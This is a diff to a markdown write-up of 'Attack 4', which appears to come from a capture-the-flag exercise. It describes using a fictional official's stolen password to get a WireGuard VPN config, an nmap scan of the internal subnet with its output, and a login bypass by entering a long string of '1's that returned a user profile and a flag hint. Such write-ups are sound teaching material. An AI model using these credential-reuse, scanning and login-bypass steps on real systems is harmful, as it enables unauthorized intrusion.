@@ -1,11 +1,9 @@
 # Attack 4
 
+By using Jonas Dahl's password, we were able to retrieve
+the configuration details for WireGuard, a VPN service.
 
-
-
-
-This is the configuration we used for connecting to WireGuard
-
+This is the configuration we used for connecting our computer to WireGuard.
 
 ```
 [Interface]
@@ -20,10 +18,45 @@ Endpoint = 64.225.76.73:51820
 AllowedIPs = 0.0.0.0/0
 ```
 
+Then we scanned with `nmap 22 10.13.13.0/24`.
 
-The JSON response when logging in with password as "1111111111111111111..." on the supervisor access login page.
-
+The result of the command gave us this:
 ```
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-05 09:08 CET
+Nmap scan report for 10.13.13.1
+Host is up (0.015s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+53/tcp   open  domain
+8080/tcp open  http-proxy
+
+Nmap scan report for 10.13.13.12
+Host is up (0.000052s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 10.13.13.253
+Host is up (0.016s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 10.13.13.254
+Host is up (0.016s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.97 seconds
+```
+Now after having scanned all the available ports, we checked out all the HTTP servers, thar revealed a login page.
+
+During logging in to the HTTP page, there was no visual result. We could however see the result in inspect element showing HTTP status 200, with JSON content of `{"error": "Login failed"}`.
+
+The first thing we tried was to enter "1111111111111111111111111111...", and hopefully try to evaluate potential booleans to true. After trying that, we got this result:
+
+```json
 {
   "name": "Jonas Dahl",
   "email": "jonas.dahl@regjeringen.no",
@@ -79,3 +112,5 @@ The JSON response when logging in with password as "1111111111111111111..." on t
   "dropbox": "https://dropbox.internal.regjeringen.uiaikt.no/"
 }
 ```
+
+As we can see from this JSON file, there is a hint near the bottom, telling us that "Dropbox is the flag" and to visit the Dropbox website.
